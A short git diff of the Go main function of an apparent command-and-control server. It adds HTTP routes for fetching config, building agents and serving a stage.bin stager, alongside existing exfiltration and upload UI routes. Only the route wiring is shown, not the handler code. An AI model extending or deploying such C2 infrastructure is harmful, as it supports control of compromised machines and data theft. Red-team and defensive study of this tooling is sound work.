@@ -24,6 +24,13 @@ func main() {
 	http.HandleFunc("/exfilUI", handlers.ExfilUIHandler)
 	http.HandleFunc("/uploadUI", handlers.UploadUIHandler)
 
+	http.HandleFunc("/getconfig", handlers.GetConfigHandler)
+
+	http.HandleFunc("/buildUI", handlers.BuildUIHandler)
+	http.HandleFunc("/buildAgent", handlers.BuildAgentHandler)
+
+	http.HandleFunc("/stage.bin", handlers.StageHandler)
+
 	log.Println("[+] C2 Server running on :8080")
 	http.ListenAndServe(":8080", nil)
 }
